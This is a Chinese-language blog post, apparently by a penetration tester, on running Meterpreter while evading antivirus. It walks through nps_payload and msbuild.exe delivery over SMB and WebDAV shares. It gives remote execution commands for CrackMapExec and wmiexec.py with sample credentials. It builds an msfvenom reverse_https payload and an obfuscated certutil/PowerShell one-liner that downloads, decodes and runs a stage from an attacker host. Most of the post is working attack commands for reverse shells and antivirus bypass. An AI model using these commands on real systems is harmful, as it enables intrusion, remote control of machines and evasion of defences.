---
layout:     post
title:      使用Meterpreter的多种姿势
date:       2019-1-5
author:     Wh0ale
header-img: img/meterpreter.jpg
catalog: true
tags:
    - bypass
---

# Meterpreter Bypassing AntiVirus

## 一、nps_payload

安装：

```
git clone https://github.com/trustedsec/nps_payload.git
cd nps_payload/
pip install -r requirements.txt
python nps_payload.py
```

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyuu1u8ahqj20z40leq6c.jpg)

>1. Run "msfconsole -r msbuild_nps.rc" to start listener.
>2. Choose a Deployment Option (a or b): - See README.md for more information.
>     a. Local File Deployment:
>
>    - %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe <folder_path_here>\msbuild_nps.xml
>  b. Remote File Deployment:
>
>    - wmiexec.py <USER>:'<PASS>'@<RHOST> cmd.exe /c start %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\<attackerip>\<share>\msbuild_nps.xml
>
>3. Hack the Planet!!

开启SMB共享

```
apt-get install samba
cd /etc/samba/
vi smb.conf
```

```
添加
[Guest]
        comment = Guest
        path = /tmp/share/
        browseable = yes
        read only = yes
        guest ok = yes
```

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyuuf146znj20jn03qmx7.jpg)

连接：

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyvhxyqqt1j20rx0g0wg2.jpg)

smb只能在内网共享，所以我想在公网使用没成功。

```
mkdir /tmp/share
cp ~/nps_payload/msbuild_nps.xml /tmp/share/
```

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyuuhvbjlqj20hd04c3yy.jpg)

开启msfconsole监听：

```
msfconsole
msf > use exploit/multi/handler 
msf exploit(handler) > set payload windows/meterpreter/reverse_https
msf exploit(handler) > set lhost 192.168.xxx.xxx
msf exploit(handler) > set lport 443
msf exploit(handler) > exploit -j
```



三种方式获得shell

①与主机有RDP连接，只需将此命令粘贴到命令提示符

```
%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe <folder_path_here>\msbuild_nps.xml
```

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyvin22ys2j20oy03374c.jpg)

②CrackMapExec

```
crackmapexec smb 192.168.137.1 -u Administrator -p Password123 -x '%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\192.168.137.133\Guest\msbuild_nps.xml'
```

③mpacket’s wimiexec.py

```
python wmiexec.py Adminstrator:Password123@192.168.137.1 cmd.exe /c start %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\192.168.137.133\Guest\msbuild_nps.xml
```

在测试时，我在执行这些操作时遇到了一些麻烦。因此，我想到了一种更好的方式来交付有效载荷而不是使用SMB。我决定使用[WebDAV](https://en.wikipedia.org/wiki/WebDAV)。为何选择WebDAV？这是UNC路径的有趣之处。Windows将首先尝试通过端口445通过SMB访问主机。如果不能，它将尝试在端口80上使用WebDAV。这有用的原因有以下几点：

1. SMB通常在防火墙处被阻止。如果我们想从远程系统中提取有效负载，这可能不起作用，因为端口445被阻止。
2. 从CrackMapExec版本4开始，它需要在端口445上运行的SMB服务器才能执行命令。我们不能同时在同一主机上使用我们的Samba共享和CME。
3. 如果担心基于网络的检测，WebDAV也可以通过HTTPS。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyuun466tzj20kx0ibq4x.jpg)

有很多方法可以设置WebDAV服务器。虽然您可以使用Apache，但我选择使用名为[WsgiDAV](https://wsgidav.readthedocs.io/en/latest/)的python工具为我创建一个。

只需输入以下内容即可通过pip安装它：

```
pip install WsgiDAV
```

要使用它，请运行命令：

```
`pip install wsgidav cheroot``wsgidav --host=0.0.0.0 --port=80 --root=/tmp`
```

对于此示例，我将有效负载放在名为“ *test* ” 的文件夹中的*/ tmp /*目录中。

要远程执行有效负载，我们运行一个非常相似的命令：

CrackMapExec：

```
crackmapexec smb 192.168.137.1 -u Administrator -p Password123 -x '%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\192.168.137.134\Davwwwroot\test\msbuild_nps.xml'
```

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyvio52j9zj20oq02tglq.jpg)

Impacket的wimiexec.py：

```
python wmiexec.py Administrator:Password123@192.168.137.1
C:\>%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\192.168.137.134\Davwwwroot\test\msbuild_nps.xml
```

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyviok4f3ej20od03874f.jpg)



有了它，我们现在无需使用SMB即可在目标上执行无文件执行。没有任何内容写入磁盘，没有SMB流量出站，并完全逃避反病毒软件。

**注意**：重启Kali Linux后，我在Windows主机上连接到Kali上的WebDAV服务器时出现问题。要修复它，我只是启动并停止了Samba。



## 二、使用CertUtil.exe进行内存中注入

[Invoke-CradleCrafter](https://github.com/danielbohannon/Invoke-CradleCrafter)是PowerShell v2.0 +兼容的PowerShell远程下载底座生成器和混淆器。

我将讨论使用PowerShell，Invoke-CradleCrafter和Microsoft的Certutil.exe来制作有效载荷和单行程序的步骤，这些程序可用于规避最新版本的Windows Defender（截至撰写本文时），以及作为不被入侵检测系统和行为分析捕获的提示。毕竟，PowerShell仍然是获得立足点的最简单和最好的方法之一，但与此同时它正在把你卖掉，因为它会在AMSI运行后立即与AMSI对话，这会让事情变得有点挑战。这种方法的优点在于，Microsoft的certutil会将网络调用到你的主要负载，同时看起来是一个无辜的小证书文件，而不是您的标准PowerShell Invoke-Shellcode摇篮。

**设置要求：** Linux，Metasploit，Invoke-CradleCrafter，适用于Linux的PowerShell和Windows 10. 
安装[适用于Linux](https://github.com/PowerShell/PowerShell)和[Metasploit的](https://github.com/rapid7/metasploit-framework)[PowerShell](https://github.com/PowerShell/PowerShell)。

当我这样做时，我更喜欢在Linux上运行PowerShell，因此Defender不会绊倒。[从GitHub下载Invoke-CradleCrafter。](https://github.com/danielbohannon/Invoke-CradleCrafter.git)

接下来，我们将通过执行以下操作创建base64编码的PowerShell Meterpreter有效负载：

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<YOUR IP HERE> LPORT=443 -e cmd/powershell_base64 -f psh -o load.txt
```

**请注意**，只要certutil可以获取并阅读其内容，有效负载文件的扩展名就可以是任何内容。例如，组织可能具有不允许下载脚本的策略（或IDS，内容过滤器等），但是它们可能允许.txt文件甚至具有异常扩展的文件。如果您更改它，只需确保在Invoke-CradleCrafter中设置URL时进行补偿（见下文）。

接下来，您将创建一个用于提供Web内容的文件夹。在此示例中，我们将调用文件夹有效内容。将PowerShell Meterpreter PowerShell脚本放在此文件夹中。

接下来，我们将使用Invoke-CradleCrafter来模糊我们的certutil和PowerShell命令，这些命令将用于执行绕过Defender的内存中注入。

通过键入pwsh或powershell，在Linux主机上进入PowerShell提示符。进入后**，**进入您的Invoke-CradleCrafter目录并运行以下命令：

```powershell
Import-Module .\Invoke-CradleCrafter.psd1
Invoke-CradleCrafter
```

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyvj7h4f15j20h40ls41r.jpg)

```
SET URL http://192.168.211.179/load.txt
下一步键入MEMORY，然后键入CERTUTIL：
```

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyvj9bce27j20h40pcaf3.jpg)

接下来，您将看到您的混淆选项。我通常选择**All**然后输入**1**

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyvj9guau3j20hm0irwhl.jpg)

获得结果后，将其放在Windows计算机上名为raw.txt的文件中。您将使用certutil在base64中对此文件进行编码，以创建名为cert.cer的文件并将其放在Web服务器上。然后，我们将构建一个单行程，将远程调用以下拉该文件并将其在目标上执行。一旦执行，它将调用我们的有效负载load.txt并通过PowerShell将Meterpreter注入内存。 

使用certutil对raw.txt文件进行编码：

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyvjbn6tbgj20r80arjsa.jpg)

```
One-liner:

powershell.exe -Win hiddeN -Exec ByPasS add-content -path %APPDATA%\cert.cer (New-Object Net.WebClient).DownloadString('http://192.168.211.179/cert.cer'); certutil -decode %APPDATA%\cert.cer %APPDATA%\stage.ps1 & start /b cmd /c powershell.exe  -Exec Bypass -NoExit -File %APPDATA%\stage.ps1 & start /b cmd /c del %APPDATA%\cert.cer
```



被火绒杀了...想法很好但是没实现，算是拓宽了思维了。





Reference：

[https://www.n00py.io/2018/06/executing-meterpreter-in-memory-on-windows-10-and-bypassing-antivirus-part-2/](https://www.n00py.io/2018/06/executing-meterpreter-in-memory-on-windows-10-and-bypassing-antivirus-part-2/)



